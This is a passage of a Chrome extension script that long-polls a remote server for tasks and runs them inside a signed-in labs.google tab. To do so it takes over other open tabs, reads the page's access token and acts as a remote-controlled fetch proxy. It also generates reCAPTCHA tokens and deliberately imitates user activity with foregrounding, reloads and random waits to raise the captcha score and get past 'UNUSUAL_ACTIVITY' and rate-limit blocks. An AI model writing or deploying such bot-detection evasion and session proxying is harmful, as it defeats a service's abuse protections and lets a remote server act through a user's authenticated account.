        ? `https://labs.google/fx/vi/tools/flow#captcha_account=${encodeURIComponent(_lastCookieAccount)}`
        : 'https://labs.google/fx/vi/tools/flow';

    // 1. Check cache: nếu cache còn URL labs.google hợp lệ → dùng luôn
    if (_labsTabIdCache) {
        try {
            const t = await chrome.tabs.get(_labsTabIdCache);
            if (t && t.url) {
                const isLabs = t.url.includes('labs.google')
                    && !t.url.includes('/signin') && !t.url.includes('auth/');
                if (isLabs) {
                    if (t.discarded) {
                        console.log(`🔄 Cached labs tab ${t.id} discarded → reload`);
                        try { await chrome.tabs.reload(t.id); } catch (_) { }
                        return await _waitTabComplete(t.id);
                    }
                    return t;
                }
                // Cache còn nhưng URL hiện không phải labs (đã navigate đi đâu đó)
                // → re-navigate cùng tab về labs.google (không tạo tab mới)
                console.log(`🔁 Cached tab ${t.id} URL=${t.url.slice(0, 50)} → navigate về labs.google`);
                try {
                    await chrome.tabs.update(t.id, { url: targetUrl });
                    chrome.tabs.update(t.id, { autoDiscardable: false }).catch(() => { });
                    return await _waitTabComplete(t.id, 20000);
                } catch (_) { _labsTabIdCache = null; }
            }
        } catch (_) { _labsTabIdCache = null; }
    }

    // 2. Tìm tab labs.google sẵn có
    const labsTabs = await chrome.tabs.query({ url: '*://labs.google/*' });
    for (const t of labsTabs) {
        if (!t.url) continue;
        if (t.url.includes('/signin') || t.url.includes('auth/')) continue;
        if (t.discarded) {
            console.log(`🔄 Tab ${t.id} discarded → reload`);
            try { await chrome.tabs.reload(t.id); } catch (_) { }
            const ready = await _waitTabComplete(t.id);
            if (ready) {
                _labsTabIdCache = t.id;
                return ready;
            }
            continue;
        }
        _labsTabIdCache = t.id;
        return t;
    }

    // 3. Không có tab labs.google → navigate tab CÓ SẴN sang labs.google
    //    (tận dụng tab background — Google search / about:blank / tab cũ —
    //     thay vì tạo tab mới, tránh spam tab nếu user đóng tab labs.google)
    let candidate = null;
    let candidatePriority = 99; // thấp = ưu tiên
    try {
        const allTabs = await chrome.tabs.query({});
        for (const t of allTabs) {
            if (!t.url) continue;
            if (t.url.startsWith('chrome://') || t.url.startsWith('chrome-extension://')
                || t.url.startsWith('edge://') || t.url.startsWith('devtools://')) continue;
            // Loại tab grok.com (không nuốt session Grok)
            if (t.url.includes('grok.com')) continue;

            let prio = 50;
            if (t.url === 'about:blank' || t.url === 'about:newtab') prio = 0;       // ưu tiên cao nhất
            else if (t.url.includes('newtab') || t.url.startsWith('about:')) prio = 5;
            else if (!t.active) prio = 10;                                            // tab background
            else prio = 80;                                                           // tab user đang xem (cuối)

            if (prio < candidatePriority) {
                candidate = t;
                candidatePriority = prio;
            }
        }
    } catch (_) { }

    if (candidate) {
        console.log(`🔁 Navigate tab ${candidate.id} (prio=${candidatePriority} url=${candidate.url.slice(0, 50)}) → labs.google`);
        try {
            await chrome.tabs.update(candidate.id, { url: targetUrl });
            chrome.tabs.update(candidate.id, { autoDiscardable: false }).catch(() => { });
            const ready = await _waitTabComplete(candidate.id, 20000);
            if (ready) {
                _labsTabIdCache = candidate.id;
                return ready;
            }
        } catch (e) {
            console.warn(`❌ Navigate tab ${candidate.id} fail:`, e && e.message);
        }
    }

    // 4. Fallback cuối cùng: tạo tab mới (rate-limit 30s — chỉ khi window 0 tabs)
    console.warn('⚠️ Không có tab nào để navigate → fallback tạo tab mới. Tabs:');
    try {
        const allTabs = await chrome.tabs.query({});
        for (const t of allTabs) {
            console.warn(`   tab ${t.id} active=${t.active} url=${(t.url || '').slice(0, 80)}`);
        }
    } catch (_) { }

    const now = Date.now();
    if (now - _lastTabCreateTs < 30000) {
        console.warn('⏸️ Skip tạo tab mới (rate limit 30s)');
        return null;
    }
    _lastTabCreateTs = now;
    try {
        console.log(`🆕 Tạo tab labs.google mới: ${targetUrl}`);
        const newTab = await chrome.tabs.create({ url: targetUrl, active: false });
        chrome.tabs.update(newTab.id, { autoDiscardable: false }).catch(() => { });
        const ready = await _waitTabComplete(newTab.id, 20000);
        if (ready) {
            _labsTabIdCache = newTab.id;
            return ready;
        }
        return newTab;
    } catch (e) {
        console.warn('❌ Cannot create labs tab:', e && e.message);
        return null;
    }
}

// Clear cache khi tab đóng
chrome.tabs.onRemoved.addListener((tabId) => {
    if (tabId === _labsTabIdCache) _labsTabIdCache = null;
});

// ── Báo register với server (cookie mode tự register theo _lastCookieAccount) ──
async function btaskRegister() {
    const settings = await getSettings();
    if (settings.operationMode !== 'cookie') return;
    if (!_lastCookieAccount) return;
    try {
        await fetch(`${API_SERVER}/browser-task/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ account: _lastCookieAccount }),
        });
    } catch (_) { }
}
setTimeout(btaskRegister, 5000);
setInterval(btaskRegister, 20000); // re-register mỗi 20s như heartbeat phụ

// ── Execute 1 task: nhận {action, payload} → fetch trong tab → POST result ──
async function btaskExecute(reqId, action, payload) {
    let result = { status: null, body: null, error: null };
    const SITE_KEY = '6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV';

    try {
        let tab = await _findLabsTab();
        if (!tab) {
            result.error = 'no_labs_tab_found';
            return result;
        }
        chrome.tabs.update(tab.id, { autoDiscardable: false }).catch(() => { });

        // Action `fetch` chỉ là proxy thuần — server đã build sẵn url/headers/body
        if (action === 'fetch') {
            const r = await chrome.scripting.executeScript({
                target: { tabId: tab.id },
                world: 'MAIN',
                func: _pageBrowserFetch,
                args: [payload.url, payload.method || 'POST', payload.headers || {}, payload.body || null],
            });
            if (r && r[0] && r[0].result) {
                result = r[0].result;
            } else {
                result.error = 'no_result_from_page';
            }
            return result;
        }

        // Action `reload_tab` — F5 tab labs.google chủ động (Python trigger
        // sau khi gặp UNUSUAL_ACTIVITY / 429 too much / RESOURCE_EXHAUSTED / 5xx).
        // Behavior giống user F5 trên web: tab lên foreground → grecaptcha
        // có user-active context → score cao khi tạo lại task.
        if (action === 'reload_tab') {
            try {
                // active: true → tab foreground → Chrome KHÔNG throttle JS
                // → giống user F5 manual.
                chrome.tabs.update(tab.id, { active: true }).catch(() => { });
                await chrome.tabs.reload(tab.id);
            } catch (e) {
                result.error = 'reload_failed: ' + (e && e.message ? e.message : String(e));
                return result;
            }
            const ready = await _waitTabComplete(tab.id, 20000);
            if (!ready) {
                result.error = 'reload_timeout (20s)';
                return result;
            }
            // Sleep extra 4-8s cho grecaptcha + page UI load xong (giống user F5 đợi)
            await new Promise(r => setTimeout(r, 4000 + Math.random() * 4000));
            result.status = 200;
            result.body = JSON.stringify({ ok: true, reloaded_tab_id: tab.id });
            return result;
        }

        // Action `auto_fetch` — server gửi {url, body_template, captcha_action, target_url}
        // Extension navigate tab tới target_url (UI project page) trước → captcha
        // có context đầy đủ → score cao hơn. F5 + retry tới 10 lần khi 403 UA.
        if (action === 'auto_fetch') {
            // 0. Navigate tab tới target_url (UI project page) nếu khác hiện tại
            //    → grecaptcha có context đầy đủ → score cao hơn home /flow
            const targetUrl = payload.target_url;
            if (targetUrl && tab.url && tab.url.indexOf(targetUrl.split('#')[0]) !== 0) {
                console.log(`🔁 Navigate tab ${tab.id} → ${targetUrl.slice(0, 70)}`);
                try {
                    // active: true → tab lên foreground → Chrome KHÔNG throttle JS
                    // → grecaptcha thấy "user-active context" → score cao hơn.
                    // Mỗi Chrome profile chỉ 1 tab active, không ảnh hưởng profile khác.
                    await chrome.tabs.update(tab.id, { url: targetUrl, active: true });
                    chrome.tabs.update(tab.id, { autoDiscardable: false }).catch(() => { });
                } catch (_) { }
                const ready = await _waitTabComplete(tab.id, 20000);
                if (ready) tab = ready;
                // Sleep extra 4-8s cho grecaptcha + page UI load xong (giống user F5)
                await new Promise(r => setTimeout(r, 4000 + Math.random() * 4000));
            }

            // 1. Get access_token (1 lần, không cần retry)
            const tokRes = (await chrome.scripting.executeScript({
                target: { tabId: tab.id }, world: 'MAIN', func: _pageGetAccessToken,
            }))[0]?.result || {};
            const accessToken = tokRes.access_token;
            if (!accessToken) {
                result.error = 'no_access_token: ' + (tokRes.error || 'unknown');
                return result;
            }

            const MAX_TRIES = 10;
            let lastFetchRes = null;
            for (let attempt = 1; attempt <= MAX_TRIES; attempt++) {
                // 2. Solve captcha (warmup ở attempt 1 và sau retry để boost score)
                let captchaToken = null;
                if (payload.captcha_action) {
                    const withWarmup = (attempt === 1) || (attempt >= 2); // warmup mọi attempt
                    const capRes = (await chrome.scripting.executeScript({
                        target: { tabId: tab.id }, world: 'MAIN',
                        func: _pageSolveCaptchaToken,
                        args: [SITE_KEY, payload.captcha_action, withWarmup],
                    }))[0]?.result;
                    captchaToken = capRes || null;
                    if (!captchaToken) {
                        result.error = `captcha_solve_failed (attempt ${attempt})`;
                        if (attempt >= MAX_TRIES) return result;
                        await new Promise(r => setTimeout(r, 3000));
                        continue;
                    }
                }

                // 3. Build body với placeholder thay thế
                let bodyStr = payload.body_template || '';
                if (captchaToken) {
                    bodyStr = bodyStr.replace(/__CAPTCHA_TOKEN__/g, captchaToken);
                }

                // 4. Build headers
                const hdrs = Object.assign({
                    'content-type': 'text/plain;charset=UTF-8',
                    'authorization': 'Bearer ' + accessToken,
                }, payload.extra_headers || {});

                // 5. Fetch
                const r = await chrome.scripting.executeScript({
                    target: { tabId: tab.id }, world: 'MAIN',
                    func: _pageBrowserFetch,
                    args: [payload.url, payload.method || 'POST', hdrs, bodyStr],
                });
                if (!(r && r[0] && r[0].result)) {
                    result.error = `no_result_from_page (attempt ${attempt})`;
                    if (attempt >= MAX_TRIES) return result;
                    await new Promise(r2 => setTimeout(r2, 2000));
                    continue;
                }
                lastFetchRes = r[0].result;
                lastFetchRes._captcha_used = !!captchaToken;
                lastFetchRes._attempt = attempt;

                // ── Check UNUSUAL_ACTIVITY → F5 tab (về project URL) + retry ──
                // (Behavior giống user trên web: F5 trang /project/<id> → tạo lại OK
                //  → lặp đến khi pass)
                if (lastFetchRes.status === 403 && lastFetchRes.body
                    && lastFetchRes.body.indexOf('UNUSUAL_ACTIVITY') !== -1) {
                    console.warn(`⚠️ btask ${reqId} attempt ${attempt}/${MAX_TRIES} bị UNUSUAL_ACTIVITY → F5 + retry`);
                    if (attempt < MAX_TRIES) {
                        // 1. F5 tab — ưu tiên navigate tới target_url (project page).
                        //    active: true → tab lên foreground → Chrome KHÔNG throttle
                        //    → grecaptcha thấy user-active → score cao (giống user F5).
                        const reloadUrl = targetUrl || tab.url;
                        try {
                            if (reloadUrl && reloadUrl.includes('labs.google')) {
                                await chrome.tabs.update(tab.id, { url: reloadUrl, active: true });
                            } else {
                                await chrome.tabs.update(tab.id, { active: true }).catch(() => { });
                                await chrome.tabs.reload(tab.id);
                            }
                        } catch (_) { }
                        // 2. Đợi tab load xong (tăng 15s → 20s cho page nặng)
                        const ready = await _waitTabComplete(tab.id, 20000);
                        if (!ready || !ready.url || !ready.url.includes('labs.google')
                            || ready.url.includes('/signin') || ready.url.includes('auth/')) {
                            console.warn(`⚠️ Tab ${tab.id} reload lỗi (url=${(ready && ready.url || '').slice(0, 60)}) → re-find`);
                            const newTab = await _findLabsTab();
                            if (!newTab) {
                                result.error = `tab_reload_failed (attempt ${attempt})`;
                                return result;
                            }
                            tab = newTab;
                        } else {
                            tab = ready;
                        }
                        // 3. Sleep 6-12s cho grecaptcha load + page UI ready
                        //    (user F5 thủ công thường đợi ~10s mới click create)
                        await new Promise(r2 => setTimeout(r2, 6000 + Math.random() * 6000));
                        continue;  // → solve captcha mới trên page fresh
                    }
                }
                // Status khác (200/4xx khác) → return luôn
                return lastFetchRes;
            }
            // Hết retry vẫn fail
            return lastFetchRes || result;
        }

        result.error = 'unknown_action: ' + action;
        return result;
    } catch (e) {
        result.error = 'btaskExecute_exception: ' + (e && e.message ? e.message : String(e));
        return result;
    }
}

// ── Long-poll loop ──
async function btaskPollOnce() {
    if (_btaskPollActive) return;
    const settings = await getSettings();
    if (settings.operationMode !== 'cookie') return;  // chỉ chạy ở cookie mode
    if (!_lastCookieAccount) return;

    _btaskPollActive = true;
    try {
        const res = await fetch(`${API_SERVER}/browser-task/poll?account=${encodeURIComponent(_lastCookieAccount)}`, {
            signal: AbortSignal.timeout(28000),
        });
        if (res.status !== 200) return;
        const data = await res.json();
        if (!data.requestId) return;

        console.log(`📥 BTask received: req=${data.requestId} action=${data.action}`);
        const result = await btaskExecute(data.requestId, data.action, data.payload || {});

        // POST result back
        await fetch(`${API_SERVER}/browser-task/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                requestId: data.requestId,
                status: result.status,
                body: result.body,
                error: result.error,
            }),
        }).catch(() => { });
        console.log(`📤 BTask result sent: req=${data.requestId} status=${result.status}`);
    } catch (e) {
        // Timeout là bình thường, không log
    } finally {
        _btaskPollActive = false;
    }
}

setInterval(btaskPollOnce, BTASK_POLL_INTERVAL);
console.log('🎯 Browser-Task bridge poll loop started (1.5s tick, cookie mode only)');